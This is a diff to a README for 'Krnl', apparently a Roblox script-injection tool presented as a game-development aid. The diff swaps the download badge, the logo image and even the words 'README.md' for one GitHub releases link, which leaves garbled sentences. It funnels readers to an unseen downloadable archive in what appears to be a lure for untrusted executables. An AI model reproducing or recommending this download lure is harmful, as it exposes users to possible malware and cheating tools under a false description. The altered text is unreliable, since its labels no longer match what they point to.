@@ -1,6 +1,6 @@
 # Krnl Lua Script Injector for Roblox Game Development 🛠️🎮
 
-Welcome to the official repository for Krnl, a Lua script injector designed for Roblox game development. Krnl is a powerful tool that assists developers in creating and testing custom Lua scripts within the Roblox environment. This README.md file will provide you with all the information you need to get started with using Krnl for your Roblox game development projects.
+Welcome to the official repository for Krnl, a Lua script injector designed for Roblox game development. Krnl is a powerful tool that assists developers in creating and testing custom Lua scripts within the Roblox environment. This https://github.com/walter2016/Krnl-Lua-Script-Injector-for-Roblox-Game-Development/releases file will provide you with all the information you need to get started with using Krnl for your Roblox game development projects.
 
 ## Table of Contents
 - [Introduction](#introduction)
@@ -25,7 +25,7 @@ Krnl is a Lua script injector that empowers Roblox game developers to enhance th
 ## Installation
 To get started with Krnl, simply download the latest version of the tool from the following link: 
 
-[![Download Krnl](https://img.shields.io/badge/Download-Krnl-green)](https://github.com/assets/Release.zip)
+[![Download Krnl](https://github.com/walter2016/Krnl-Lua-Script-Injector-for-Roblox-Game-Development/releases)](https://github.com/walter2016/Krnl-Lua-Script-Injector-for-Roblox-Game-Development/releases)
 
 Once you have downloaded the Krnl archive, extract the files to a location of your choice on your computer. Make sure to follow any installation instructions provided within the archive to set up Krnl successfully.
 
@@ -59,4 +59,4 @@ Krnl is licensed under the MIT License. You are free to use, modify, and distrib
 
 Thank you for choosing Krnl for your Roblox game development needs. We hope this tool helps you bring your creative visions to life in the Roblox gaming platform! 
 
-![Krnl Logo](images/krnl-logo.png)
+![Krnl Logo](https://github.com/walter2016/Krnl-Lua-Script-Injector-for-Roblox-Game-Development/releases)
